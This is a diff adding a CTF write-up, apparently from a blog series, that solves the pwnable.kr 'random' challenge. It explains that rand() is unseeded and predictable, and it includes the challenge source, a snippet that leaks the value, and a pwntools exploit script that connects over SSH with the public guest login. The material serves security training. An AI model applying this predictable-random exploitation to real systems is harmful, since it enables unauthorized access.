@@ -147,3 +147,78 @@ print p.recvall()
 Finally the exploit in action!
 
 ![](images/pwn_a_day/day4/5.png)
+
+Moving on to next challenge
+
+## Name - Random
+
+Lets take a look at the source
+
+```c
+#include <stdio.h>
+
+int main(){
+        unsigned int random;
+        random = rand();        // random value!
+
+        unsigned int key=0;
+        scanf("%d", &key);
+
+        if( (key ^ random) == 0xdeadbeef ){
+                printf("Good!\n");
+                system("/bin/cat flag");
+                return 0;
+        }
+
+        printf("Wrong, maybe you should try 2^32 cases.\n");
+        return 0;
+}
+```
+so it seem that **rand()** function is being run without any seed so it will return the same value everytime we run the function
+so lets get that value first 
+
+just write a short script like this on the server and compile and run it to get the value
+
+```c
+#include <stdio.h>
+
+int main(){
+        unsigned int random;
+        random = rand();
+
+        printf("%d\n", random);
+        return 0;
+}
+```
+![](images/pwn_a_day/day4/6.png)
+
+So now we cook up a simple script to xor to strings and get the flag
+
+```python
+from pwn import *
+
+ssh_connect=True
+
+if ssh_connect:
+	server = ["pwnable.kr", 2222, "random", "guest"]
+	ssh_handle=ssh(host=server[0],port=server[1],user=server[2],password=server[3])
+	p=ssh_handle.process("./random")
+else:
+	elf=ELF("./random")
+	p=elf.process()
+
+rand_int=1804289383
+final_val=0xdeadbeef
+
+key=rand_int^final_val
+
+p.sendline(str(key))
+print p.recvall()
+```
+
+Finally the script in action
+
+![](images/pwn_a_day/day4/7.png)
+
+Hope you are Enjoying this!!
+
